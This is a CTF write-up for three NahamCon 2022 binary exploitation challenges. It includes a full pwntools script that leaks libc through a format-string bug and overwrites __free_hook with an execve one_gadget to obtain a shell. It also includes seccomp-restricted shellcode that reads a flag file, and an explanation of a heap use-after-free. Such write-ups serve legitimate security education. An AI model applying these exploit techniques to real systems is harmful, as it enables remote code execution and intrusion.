# Untitled

# Reading list

[file](https://github.com/vietd0x/ctf-writeups/raw/main/readingList.tar.gz), first i use `patchelf` to set provide libc for binary (compiled with full protect).  At first glance, i think this chall must be a heap challenge, but it only using fmt bug.

Using local variable (name) to write 3 qword addrs (`__free_hook`; `__free_hook+2` and `__free_hook+4`) for referencing from stack. By that way we can change `__free_hook` become execve (one_gadget).

```c
idx = 0
void add():
    // use this booklist for allocator
    booklist = realloc(booklist, 8*(idx+1))
    printf("Enter the book name: ");

    lineptr = NULL;
    inpLen = 0;
    inpLen = getline(&lineptr, &n, stdin);
    lineptr[--inpLen] = 0;

    *((_QWORD *)booklist + v4) = lineptr;
    ++idx;

void show():
   printf("%s's reading list\n", name); 
   for ( i = 0; i < idx; ++i){
        printf("%d.", i + 1);
        // format string bug
        printf(booklist[i]); 
   }

void free():
    do{
        puts("Enter the number for the book you would like to remove");
        show(name);

        size_t pos = -1
        printf(": ");
        scanf("%zu", &pos); getchar();
        --pos;
    }while(idx -1 < pos);

    free(booklist[pos]);
    booklist[pos] = NULL;
    for(i = pos; i < idx-1; ++i)
        booklist[i] = booklist[i+1];
    --idx;
```

```python
#!/usr/bin/env python3
from pwn import *
def start(argv=[], *a, **kw):
    return remote("challenge.nahamcon.com", 32580, *a, **kw)

# b *main+123
gs = '''
init-pwndbg
b *print_list+134
c
'''.format(**locals())

exe = './reading_list'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
context.log_level = 'info'

def show():
  io.sendafter(b'> ', b'1\n')
def add(data):
  io.sendafter(b'> ', b'2\n')
  io.sendlineafter(b'Enter the book name: ', data)
def free(i, write=False):
  io.sendafter(b'> ', b'3\n') 
  io.sendlineafter(b': ', str(i).encode())
def changeName(bdata):
  io.sendafter(b'> ', b'4\n')
  io.sendlineafter(b'What is your name: ', bdata)

io = start()

io.sendafter(b'What is your name: ', b'viet\n')
# leak libc.address
add(b'%23$p') # __libc_start_main+243
show()
io.recvuntil(b'viet\'s reading list\n1. ')
libc.address = int(io.recvline().strip(), 16) - (libc.sym.__libc_start_main+243)
log.success(f'libc base = {hex(libc.address)}')
free(1)

'''
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
one_gadget = libc.address + 0xe3b31
log.info(f'og: {hex(one_gadget)}')
free_hook = libc.sym.__free_hook
log.info(f'free_hook = {hex(free_hook)}')

# first dword
first = one_gadget & 0xffff
log.info(f"first write: {hex(first)}")
# second dword
second = (one_gadget >> 16) & 0xffff
log.info(f"second write: {hex(second)}")
# third dword
third = one_gadget >> 32
log.info(f"third write: {hex(third)}")

# change name var on the stack to __free_hook for referencing
changeName(p64(free_hook) + p64(free_hook+2) + p64(free_hook+4))

add(f"%{str(first)}c" + "%22$hn")
add(f"%{str(second)}c" + "%23$hn")
add(f"%{str(third)}c" + "%24$hn")

# write fmt and also call free
free(1)

io.interactive()
# --------------------------------
# free function, bp at printf bug:
'''
pwndbg> tel 32
00:0000│ rsp 0x7ffd961761e0 —▸ 0x564efe578840 (__libc_csu_init) ◂— endbr64
01:0008│     0x7ffd961761e8 —▸ 0x7ffd96176260 —▸ 0x7f90f024ee48 (__free_hook) ◂— 0x0
02:0010│     0x7ffd961761f0 —▸ 0x564efe5781c0 (_start) ◂— endbr64
03:0018│     0x7ffd961761f8 ◂— 0x96176390
04:0020│ rbp 0x7ffd96176200 —▸ 0x7ffd96176240 —▸ 0x7ffd961762a0 ◂— 0x0
05:0028│     0x7ffd96176208 —▸ 0x564efe578639 (remove_book+104) ◂— lea    rdi, [rip + 0xaff]
06:0030│     0x7ffd96176210 —▸ 0x564efe578840 (__libc_csu_init) ◂— endbr64
07:0038│     0x7ffd96176218 —▸ 0x7ffd96176260 —▸ 0x7f90f024ee48 (__free_hook) ◂— 0x0
08:0040│     0x7ffd96176220 —▸ 0x564efe5781c0 (_start) ◂— endbr64
09:0048│     0x7ffd96176228 —▸ 0x564efe5783b5 (get_choice+128) ◂— mov    eax, dword ptr [rbp - 0xc]
0a:0050│     0x7ffd96176230 ◂— 0xffffffffffffffff
0b:0058│     0x7ffd96176238 ◂— 0xf57eb703a3176100
0c:0060│     0x7ffd96176240 —▸ 0x7ffd961762a0 ◂— 0x0
0d:0068│     0x7ffd96176248 —▸ 0x564efe5787f9 (main+192) ◂— jmp    0x564efe578815
0e:0070│     0x7ffd96176250 —▸ 0x7ffd96176398 —▸ 0x7ffd96178430 ◂— './reading_list'
0f:0078│     0x7ffd96176258 ◂— 0x100564efe5782d9
10:0080│     0x7ffd96176260 —▸ 0x7f90f024ee48 (__free_hook) ◂— 0x0      # 22th arg
11:0088│     0x7ffd96176268 —▸ 0x7f90f024ee4a (__free_hook+2) ◂— 0x0    # 23th arg
12:0090│     0x7ffd96176270 —▸ 0x7f90f024ee4c (__free_hook+4) ◂— 0x0    # 24th arg
pwndbg> p 0x10+6
$1 = 22
'''
# used to find out the offset = 6 and first arg position = 22
'''
add(f"1. %6$p-%7$p-%8%p")
add(f"2. %6$p-%7$p-%8%p")
add(f"3. %6$p-%7$p-%8%p")
'''
```

# Stackless

```c
$ checksec
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

$ seccomp-tools dump ./stackless
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012
 0009: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0012
 0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

So, we only allowed to `read`, `write`, `open`, `close`, `exit`, and `exit_group` for writing our shellcode print out flag file.

Get seed from `/dev/urandom`  then

```c
// initial opcode
unsigned char ops[] = {0x4d, 0x31, 0xff}; // xor r15, r15
// random memory 
for (int attempts = 0; attempts < 10 && code == (void *)-1; attempts++) {
        addr = (unsigned int)rand() & ~0xfff;
        addr |= (size_t)(rand() & 0xffff) << 32;
        code = mmap((void *)addr, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, 0, 0);
}
// set perm READ, EXEC only
mprotect(code, 0x1000, PROT_READ | PROT_EXEC)
// jump to this addr and clear all regs
__asm__ volatile(".intel_syntax noprefix\n"
                     "mov r15, %[addr]\n"
                     "xor rax, rax\n"
                     "xor rbx, rbx\n"
                     "xor rcx, rcx\n"
                     "xor rdx, rdx\n"
                     "xor rsp, rsp\n"
                     "xor rbp, rbp\n"
                     "xor rsi, rsi\n"
                     "xor rdi, rdi\n"
                     "xor r8, r8\n"
                     "xor r9, r9\n"
                     "xor r10, r10\n"
                     "xor r11, r11\n"
                     "xor r12, r12\n"
                     "xor r13, r13\n"
                     "xor r14, r14\n"
                     "jmp r15\n"
                     ".att_syntax"
                     :
                     : [addr] "r"(code));
```

1. open flag.txt →`fd = 0x3`
2. by SYS_read, write to somewhere in stack, if this addr has not writeable, after SYS_WRITE, RAX will return `0xfffffffffffffff2` , otherwise, RAX will take flag length. So we must inc 0x1000 until we successful write on that addr.
    - [Another way](https://github.com/datajerk/ctf-write-ups/tree/master/nahamconctf2022/stackless), heap (with `rw-`) addr is already saved in `xmm0` .
3. Last step, write to stdout.

```python
# xpl.py
# ...
gs = '''
init-pwndbg
b *main+649
c
'''.format(**locals())

exe = './stackless'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

# open(rax=0x2, rdi=point to "flag.txt")
shellcode = asm("""
mov rax, 0x2
lea rdi, [rip]+64
syscall
""")
# read(rax=0x0, rdi=fd(0x3), rsi=0x7ff000000000+offset, rdx=0x100)
shellcode+=asm("""
mov rsi, 0x7ff000000000
cmp_loop:
add rsi, 0x1000
mov rax, 0x0
mov rdi, 0x3
mov rdx, 0x100
syscall; cmp rax, 0xfffffffffffffff2
je cmp_loop
""")

# write(rax=0x1, rdi=stdout=0x1, rdx=0x100), rsi still point to 
shellcode+=asm("""
mov rax, 0x1
mov rdi, 0x1
syscall
""")

# print(len(shellcode)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
# "flag.txt" right after shellcode
shellcode += b'flag.txt\x00'

io.sendlineafter(b'Shellcode length', b"%i" %len(shellcode))
io.sendlineafter(b'Shellcode', shellcode)

io.stream()

# ref: https://github.com/tj-oconnor/ctf-writeups/tree/main/nahamcon_ctf/stackless
```

# Free Real Estate

file, it has full protection (of course, this is heap challenge)

pseudo-code

```c
ptr *property; // this chall use only one chunk to manage info, size, addr
username, n; // .bss section; n-name length
// 1
void add_property(){
	property = malloc(64);// chunk 0x50

	printf("Enter the house number: ");
	// + 0x18
	scanf("%d", property[3]); getchar();// house_number

	printf("What is the length of the street name: ");
	// + 0x28
	scanf("%zu", property[5]); getchar();// lengthOfStreetName
	// + 0x20
	property[4] = malloc(lengthOfStreetName + 1)// addr of streetName

	printf("Enter the street name: ");
	fgets(property[4], property[5], stdin);
	property[4][strcspn(property[4], "\n")] = 0;

	printf("What is the price of the property?: ");
	scanf("%lf", property[2]); getchar();

	printf("Would you like to add a comment for this property? [y/n]: ");
	scanf("%c", &v5); getchar();
	
	if(v5 == 'y'){
		printf("What is the length of the comment?: ");
		scanf("%zu", property[7]); getchar();

		property[6] = malloc(property[7] + 1);
		printf("Enter the comment: ");
		fgets(property[6], property[7], stdin);
		property[6][strcspn(property[6], "\n")] = 0;
	}

}
/*
0 			  		| 1
2 price		  		| 3 house number
4 street name addr 	| 5 length of street name
6 cmt addr 			| 7 length of cmt
*/
// 0
void show_property(){
	puts("Your property info:\n");
  	printf("House number: %d\n", property[3]);
  	printf("Street name: %s\n", property[4]);
  	printf("Price: $%0.2f\n", property[2]);
  	if ( property[7] && property[6])
    	return printf("Comment: %s\n", property[6]);
  	else
	    return puts("No comment for the property.");
}
// 2
void remove_property(){
	if(property[6]) 
		free(property[6]);
	if(property[4]){ 
		free(property[4]);
		property[4] = NULL;
	}
	free(property);
	property = NULL;
}

void change_name(){
	printf("What is the length of your new name?: ");
	int v2 = 0; scanf("%zu", &v2); getchar();
	if(n < v2){
		free(username);
		username = malloc(v2+1);
	}
	n = v2;
	printf("Enter your new name: ");
  	fgets(username, n, stdin);
}
/*
0 			  		| 
2 price		  		| house number
4 street name addr 	| length of street name
6 cmt addr 			| length of cmt
*/
// 3
void edit_property(){
	char v7 = 'n';
	printf("Would you like to change the house number? [y/n]: "); scanf("%c", &v7); getchar();
	if(v7 == 'y'){
		printf("Enter the new house number: ");
		scanf("%d", property[3]); getchar();
		v7 = 'n';
	}

	printf("Would you like to change the street? [y/n]: "); scanf("%c", &v7); getchar();
  	if(v7 == 'y'){
  		printf("Enter the new street name length: ");
  		scanf("%zu", &v8); getchar();
  		if(property[5] < v8){
  			free(property[4]);
  			property[4] = malloc(v8+1);
  		}
  		property[5] = v8;
  		printf("Enter the new street name: ");
  		fgets(property[4], property[5], stdin);
  		v7 = 'n';
  	}

  	printf("Would you like to change the price of the property? [y/n]: "); scanf("%c", &v7); getchar();
  	if(v7 == 'y'){
  		printf("What is the new price of the property?: ");
  		scanf("%lf", &property[2]); getchar();
  		v7 = 'n';
  	}

  	if(property[6]){
  		printf("Would you like to change the comment? [y/n]: ");
    	scanf("%c", &v7); getchar();
    	if(v7 == 'y'){
    		printf("Enter the new comment length: ");
      		scanf("%zu", &v8); getchar();
      		if(property[7] < v8){
      			fre(property[6]);
      			property[6] = malloc(v8 + 1);
      		}
      		property[7] = v8;
      		printf("Enter the new comment: ");
      		fgets(property[6], property[7], stdin);
    	}
  	}else{
  		printf("Would you like to add a comment? [y/n]: ");
    	scanf("%c", &v7); getchar();
    	if(v7 == 'y'){
    		printf("what is the length of the comment: ");
    		scanf("%zu", &property[7]); getchar();
    		property[6] = malloc(property[7]+1);

    		printf("Enter the comment: ");
    		fgets(property[6], property[7], stdin);
    	}
  	}

}
```

```c
/*
0 			  		    | 1
2 price		  		  | 3 house number
4 street name addr| 5 length of street name
6 cmt addr 			  | 7 length of cmt
*/
// 1
void add_property(){
	property = malloc(64);// chunk 0x50
	malloc streetName with any size.
	can choose malloc comment or not with any size. (enter y/n)
}
// 3
void edit_property(){
	can choose edit any part in metadata of property. (enter y/n)
	if new length of streetName is larger the old one:
		- free(old)
		- malloc(new_size+1)
	Also, can add Comment property.
}
// 4
void change_name(){
	if new name size is larger the old one:
			free(old_username);
			username = malloc(new_size+1);
}
// 2
void remove_property(){
	free(Comment); // but not set null for Comment, UAF bug
	free(StreetName); StreetName = NULL;
	free(property); property = NULL;
}
// 0
void show_property(){
	just print all object in property
}
```

As you can see, after `remove_property()`  qword in index **0**, **1** will be point to tcachebins.

But `Comment`  isnt set to NULL (but it already freed), so if you call`add_property` again, we have a pointer points to the freed chunk. (UAF)

nice wu: [[1](https://chovid99.github.io/posts/nahamcon-ctf-2022/)], [[2](https://github.com/MaherAzzouzi/LinuxExploitation/blob/9b96d95619c497172fab9aa5989aec95c4a4f387/NahamCon2022/free_real/solve.py#L24)]